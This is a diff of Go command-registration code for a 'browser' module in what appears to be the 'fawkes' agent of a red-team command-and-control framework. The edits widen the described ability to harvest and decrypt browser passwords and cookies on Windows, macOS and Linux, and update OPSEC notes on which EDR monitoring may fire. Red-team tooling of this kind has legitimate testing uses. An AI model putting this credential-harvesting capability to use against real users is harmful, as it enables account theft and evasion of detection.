@@ -11,7 +11,7 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "browser",
-		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. Windows supports all actions including credential/cookie decryption via DPAPI. macOS/Linux support history, autofill, bookmarks, downloads, and Firefox cookies. (T1555.003, T1217)",
+		Description:         "Harvest browser data from Chromium-based browsers (Chrome, Edge, Chromium) and Firefox. All platforms support password and cookie decryption: Windows via DPAPI, macOS via Keychain, Linux via Secret Service/peanuts fallback. (T1555.003, T1217)",
 		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks|downloads>] [-browser <all|chrome|edge|chromium|firefox>]",
 		Version:             5,
 		SupportedUIFeatures: []string{},
@@ -32,7 +32,7 @@ func init() {
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks", "downloads"},
-				Description:      "What to harvest: passwords (Windows Chromium only — DPAPI), cookies (Windows Chromium DPAPI; Firefox plaintext on all platforms), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
+				Description:      "What to harvest: passwords (Chromium decryption on all platforms), cookies (Chromium decryption on all platforms; Firefox plaintext), history (browsing URLs), autofill (form data), bookmarks (saved URLs), or downloads (download history).",
 				DefaultValue:     "history",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -65,7 +65,7 @@ func init() {
 				if browser != "" {
 					msg += fmt.Sprintf(", target: %s", browser)
 				}
-				msg += "). Accesses browser profile databases (Login Data, Cookies, History). On Windows, uses DPAPI decryption which may trigger CryptUnprotectData monitoring. EDR may flag SQLite database access in browser profile directories."
+				msg += "). Accesses browser profile databases (Login Data, Cookies, History). Windows: DPAPI decryption (CryptUnprotectData monitoring). macOS: Keychain access. Linux: secret-tool/keyring queries. EDR may flag SQLite database access in browser profile directories."
 				return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 					TaskID:             taskData.Task.ID,
 					Success:            true,
